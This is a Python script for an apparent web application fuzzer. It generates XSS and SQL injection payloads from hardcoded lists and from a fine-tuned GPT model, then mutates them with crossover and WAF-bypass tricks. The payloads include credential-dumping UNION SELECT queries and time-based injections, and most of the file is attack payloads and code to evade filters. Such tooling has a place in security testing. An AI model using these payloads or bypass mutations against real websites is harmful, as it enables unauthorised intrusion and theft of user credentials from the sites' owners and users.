import os
import json
import random
import openai

# Initialize OpenAI API key
openai.api_key = {}

# 파일 찾기 함수
def find_latest_file_with_prefix(prefix):
    files = [f for f in os.listdir('.') if f.startswith(prefix) and f.endswith('.json')]
    if not files:
        return None
    return max(files, key=os.path.getctime)

# 입력 필드 정보를 불러오는 함수
def load_input_fields(file_path):
    with open(file_path, "r") as file:
        return json.load(file)

# 기본 페이로드 생성 함수
def generate_basic_payloads(xss_type):
    """Generate a list of basic XSS payloads based on the provided XSS type."""
    payloads = []
    if xss_type == "DOM-Based XSS":
        payloads.append(f"><img src=x onerror=alert('DOM XSS')>")
        payloads.append(f"\"><svg onload=alert('DOM XSS')></svg>")
    elif xss_type == "Stored XSS":
        payloads.append(f"><img src=x onerror=alert('Stored XSS')>")
        payloads.append(f"\"><svg onload=alert('Stored XSS')></svg>")
    elif xss_type == "Reflected XSS":
        payloads.append(f"><img src=x onerror=alert('Reflected XSS')>")
        payloads.append(f"\"><svg onload=alert('Reflected XSS')></svg>")
    else:
        payloads.append(f"<script>alert('XSS')</script>")
        payloads.append(f"<img src=x onerror=alert('XSS')>")
        payloads.append(f"<svg onload=alert('XSS')></svg>")
    return payloads

def generate_basic_sqli_payloads(sqli_type):
    """Generate a list of basic SQLi payloads based on the provided SQLi type."""
    payloads = []

    if sqli_type == "Error-Based SQLi":
        payloads.append("' OR 1=1 --")
        payloads.append("' UNION SELECT NULL, version() --")
        payloads.append("' AND 1=CAST((SELECT @@version) AS INT) --")
    elif sqli_type == "Union-Based SQLi":
        payloads.append("' UNION SELECT ALL NULL, NULL --")
        payloads.append("' UNION SELECT username, password FROM users --")
        payloads.append("' UNION SELECT NULL, table_name FROM information_schema.tables --")
    elif sqli_type == "Time-Based SQLi":
        payloads.append("' AND IF(1=1, SLEEP(5), 0) --")
        payloads.append("' AND SLEEP(5) --")
        payloads.append("' OR IF(1=1, SLEEP(5), 0) --")
    elif sqli_type == "Boolean-Based SQLi":
        payloads.append("' AND 1=1 --")
        payloads.append("' AND 1=2 --")
        payloads.append("' OR 1=1 --")
    else:
        # Default or unknown type
        payloads.append("' OR 1=1 --")
        payloads.append("' UNION SELECT NULL, NULL --")
        payloads.append("' AND SLEEP(5) --")

    return payloads

# Function to generate attack prompts based on a specific attack vector
def generate_attack_prompt(attack_type, xss_type, xss_tag, xss_events, sqli_vendor, sqli_type, crash_data_file, n):
    if attack_type not in ["XSS", "sqli"]:
        raise ValueError("Invalid attack type. Use 'xss' or 'sqli'.")
    if attack_type == "XSS":
        prompt = f"""
        Generate a list of {n} effective XSS payloads based on the following vector: 
        HTML tag: "{xss_tag}"
        Event: "{xss_events}"
        Type: "{xss_type}"
        crash file: "{crash_data_file}"

        The payloads should exploit this vector and use techniques such as alert, prompt, or eval.
        Provide only the payloads, one per line, without additional explanations or text.

        Example XSS payloads:
        - <img src=x onerror=alert(1)>
        - <svg onload=alert(1)>
        - "onmouseover=alert(1)//
        - <script>eval('ale'+'rt(1)')</script>
        - <iframe src="javascript:alert(1)">
        - <input type="text" value="XSS" onfocus="alert(1)">
        - <a href="javascript:alert(1)">click me</a>
        - %3Cimg+src%3D1+onerror%3D%22window %22%3E
        """
    elif attack_type == "sqli":
        prompt = f"""
        Generate a list of {n} effective SQL injection payloads based on the following vector: 
        Vendor: "{sqli_vendor}"
        Type: "{sqli_type}"
        crash file: "{crash_data_file}"

        The payloads should exploit and utilize techniques such as UNION SELECT, error-based, or time-based injection methods.
        Provide only the payloads, one per line, without additional explanations or text.

        Example SQLi payloads:
        - ' UNION SELECT NULL—
        - ' UNION SELECT 1,2,3—
        - ' OR '1'='1—
        - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
        - ' OR SLEEP(5)—
        - ' OR 1=1;—
        - ' AND 1=CONVERT(int, CHAR(65))—
        - ' AND (SELECT COUNT(*) FROM users)>0—


        """
    return prompt

def generate_payloads(fields, crash_data_file):
    payloads = []
    
    if isinstance(fields, dict):
        fields = [fields]  # Convert to list if a single dictionary is provided
    elif isinstance(fields, str):
        print(f"Error: Expected list of dictionaries but got a string: {fields}")
        return payloads  # Return empty payloads if input is invalid
    
    for field in fields:
        if not isinstance(field, dict):
            print(f"Error: Invalid field format, expected a dictionary but got {type(field).__name__}: {field}")
            continue

        attack_type=field.get('attack_type')
        xss_type = field.get('xss_type')
        xss_tag = field.get('tag')
        xss_events = field.get('events', [])



        # Generate the attack prompt, use a default value if events are not provided
        prompt = generate_attack_prompt(
            attack_type=attack_type,
            xss_type=xss_type,
            xss_tag=xss_tag,
            xss_events=xss_events or "onload",  # Default event if none provided
            sqli_vendor=field.get('sqli_vendor', 'mysql'),
            sqli_type=field.get('sqli_type', 'UNION SELECT'),
            crash_data_file=crash_data_file,
            n=10
            
        )

        response = openai.Completion.create(
            engine="ft:gpt-3.5-turbo-1106:personal::A5rxJ1Dz",  # Fine-tuned model
            prompt=prompt,
            max_tokens=150,
            n=1,
            stop="\n\n"
        )

        new_payloads = response['choices'][0]['text'].strip().split('\n')
        payloads.extend(new_payloads)

        if crash_data_file:
            try:
                with open(crash_data_file, "r") as file:
                    crash_data = json.load(file)

                for entry in crash_data:
                    if 'Payload' in entry:
                        payloads.append(entry['Payload'])
                    else:
                        print(f"Warning: 'Payload' key not found in entry {entry}")

            except (FileNotFoundError, json.JSONDecodeError) as e:
                print(f"Error loading crash data file: {e}")

    return payloads

# Crossover 변형 함수
def crossover_mutation(seed1, seed2, granularity="coarse"):
    if granularity == "coarse":
        seed1_parts = seed1.split("&")
        seed2_parts = seed2.split("&")
        if len(seed1_parts) > 1 and len(seed2_parts) > 1:
            random_index1 = random.randint(0, len(seed1_parts) - 1)
            random_index2 = random.randint(0, len(seed2_parts) - 1)
            seed1_parts[random_index1], seed2_parts[random_index2] = seed2_parts[random_index2], seed1_parts[random_index1]
        seed1 = "&".join(seed1_parts)
        seed2 = "&".join(seed2_parts)
    
    elif granularity == "fine":
        seed1_units = seed1.split()
        seed2_units = seed2.split()
        if seed1_units and seed2_units:
            random_index1 = random.randint(0, len(seed1_units) - 1)
            random_index2 = random.randint(0, len(seed2_units) - 1)
            seed1_units[random_index1], seed2_units[random_index2] = seed2_units[random_index2], seed1_units[random_index1]
        seed1 = " ".join(seed1_units)
        seed2 = " ".join(seed2_units)

    # Strip unnecessary spaces
    return seed1.strip(), seed2.strip()

# 필터 우회를 위한 변형 함수
def bypass_mutation(seed):
    bypass_methods = [
        lambda x: x.replace("SELECT", "SEL%45ECT"),
        lambda x: x.replace(" ", "/**/"),
        lambda x: x.replace("'", "\\'"),
        lambda x: f"/*!{x}*/"
    ]
    mutation = random.choice(bypass_methods)
    # Remove unnecessary spaces before and after the mutation
    return mutation(seed).strip()

def find_latest_file_with_prefix(prefix):
    files = [f for f in os.listdir('.') if f.startswith(prefix) and f.endswith('.json')]
    if not files:
        return None
    return max(files, key=os.path.getctime)


# 입력 필드 정보를 불러오는 함수
def load_retry_data(file_path):
    with open(file_path, "r") as file:
        return json.load(file)
# Main function to replace argument parsing

def main():
    retry_data_file_template = "retry_cycle{}.json"
    retry_file = find_latest_file_with_prefix(retry_data_file_template.split('{}')[0])
    crash_file = 'WebFizza/crash_data.json'

    if not retry_file:
        print("No retry data file found.")
        return
    

    retry_data = load_retry_data(retry_file)

    # Determine attack type based on retry data
    attack_type = retry_data[0].get('attack_type', 'XSS') if retry_data else "XSS"
    

    attack_type = "XSS"

    if attack_type == "XSS":
        seeds = generate_payloads(retry_data, crash_file)
    elif attack_type == "sqli":
        seeds = generate_payloads(retry_data, crash_file)

    for i in range(0, len(seeds) - 1, 2):
        seed1, seed2 = crossover_mutation(seeds[i], seeds[i + 1], granularity="coarse")
        mutated_seed1 = bypass_mutation(seed1)
        mutated_seed2 = bypass_mutation(seed2)
        print(f"{seeds[i].strip()}")
        print(f"{seeds[i + 1].strip()}")
        print(f"{seed1}, {seed2}")
        print(f"Bypass Mutation Result: {mutated_seed1}, {mutated_seed2}\n")

if __name__ == "__main__":
    main()